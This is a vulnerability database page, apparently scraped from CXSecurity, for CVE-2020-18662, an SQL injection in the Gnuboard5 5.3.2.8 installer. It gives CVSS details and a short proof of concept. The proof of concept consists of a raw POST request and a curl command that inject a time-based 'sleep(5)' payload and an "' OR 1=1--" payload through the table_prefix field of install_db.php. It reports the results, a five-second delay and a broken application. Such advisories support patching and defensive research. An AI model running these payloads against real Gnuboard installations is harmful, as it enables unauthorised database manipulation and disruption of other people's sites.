---
title: Gnuboard5 5.3.2.8 SQL Injection
url: https://cxsecurity.com/issue/WLB-2025040023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-16
fetch_date: 2025-10-06T22:03:51.395187
---

# Gnuboard5 5.3.2.8 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Gnuboard5 5.3.2.8 SQL Injection** **2025.04.15**  Credit:  **[CodeSecLab](https://cxsecurity.com/author/CodeSecLab/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2020-18662](https://cxsecurity.com/cveshow/CVE-2020-18662/ "Click to see CVE-2020-18662")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")**  CVSS Base Score: **7.5/10**  Impact Subscore: **6.4/10**  Exploitability Subscore: **10/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Partial**  Integrity impact: **Partial**  Availability impact: **Partial** | |

# Exploit Title: Gnuboard5 5.3.2.8 - SQL Injection
# Date: 2024-10-26
# Exploit Author: CodeSecLab
# Vendor Homepage: https://github.com/gnuboard/gnuboard5
# Software Link: https://github.com/gnuboard/gnuboard5
# Version: 5.3.2.8
# Tested on: Ubuntu Windows
# CVE : CVE-2020-18662
PoC:
1)
POST /install/install\_db.php HTTP/1.1
Host: gnuboard
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
mysql\_user=root&mysql\_pass=password&mysql\_db=gnuboard&table\_prefix=12`; select sleep(5)#
result: sleep 5s.
2)
curl -X POST http://gnuboard/install/install\_db.php \
-d "mysql\_user=root" \
-d "mysql\_pass=password" \
-d "mysql\_db=gnuboard\_db" \
-d "table\_prefix=' OR 1=1--"
result: The application does not work.
[Replace Your Domain Name and Replace Database Information]

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040023)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top